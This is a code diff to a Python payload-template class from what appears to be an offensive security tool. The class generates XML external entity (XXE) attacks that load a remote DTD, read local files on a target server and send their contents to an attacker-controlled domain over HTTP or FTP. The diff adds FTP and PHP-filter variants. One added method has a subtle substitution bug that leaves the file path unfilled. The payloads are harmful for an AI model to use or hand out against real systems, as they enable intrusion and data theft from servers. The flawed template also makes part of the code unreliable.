@@ -13,32 +13,55 @@ class XxeTemplate(BaseTemplate):
             "desc": "",  # 组件介绍
             "desc_url": "",  # 组件使用说明链接
             "choice_type": 1,  # 组件选择类型0是单选，1是多选
-            "payload": """<?xml version="1.0" encoding="UTF-8" ?>
-<!DOCTYPE ANY [
-<!ENTITY % xd SYSTEM "http://{domain}/{key}">
-    %xd;
-]>
-<root>&bbbb;</root>""",
+            "payload": """<!DOCTYPE convert [ <!ENTITY % remote SYSTEM "http://{domain}/{key}"> %remote;%int;%send; ]>""",
             "file_name": "xxe.py"
         },
         "item_info": [{
-            "name": "xxe_read_file",
+            "name": "ftp_xxe_read_file",
             "config": ["path"],
-        }],
+        },
+            {
+                "name": "xxe_read_file",
+                "config": ["path"],
+            },
+            {
+                "name": "php_xxe_read_file",
+                "config": ["path"],
+            },
+
+        ],
     }]
 
     def __init__(self):
         super().__init__()
         self.key = None
 
+    def ftp_xxe_read_file(self, item):
+        """
+        读取文件
+        """
+        read_file_code = """<!ENTITY % file SYSTEM "file://{path}">
+<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'ftp://{{key}}:123@{{domain}}:21/%file;'>"> """
+        code = read_file_code.replace("{{domain}}", self.domain).replace("{{key}}", self.key).replace("{{path}}", item[
+            "config"]["path"])
+        return code
+
     def xxe_read_file(self, item):
         """
         读取文件
         """
-        read_file_code = """<!ENTITY % aaaa SYSTEM "file://{{path}}">
-<!ENTITY % demo "<!ENTITY bbbb SYSTEM 'http://{{domain}}/{{key}}?message=%aaaa;'>">
-%demo;
+        read_file_code = """<!ENTITY % file SYSTEM "file://{{path}}">
+<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://{{domain}}/{{key}}?message=%file;'>"> """
+        code = read_file_code.replace("{{domain}}", self.domain).replace("{{key}}", self.key).replace("{{path}}", item[
+            "config"]["path"])
+        return code
+
+    def php_xxe_read_file(self, item):
         """
+        读取文件
+        """
+        read_file_code = """<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file://{{path}}">
+<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://{{domain}}/{{key}}?message=%file;'>"> """
         code = read_file_code.replace("{{domain}}", self.domain).replace("{{key}}", self.key).replace("{{path}}", item[
             "config"]["path"])
         return code
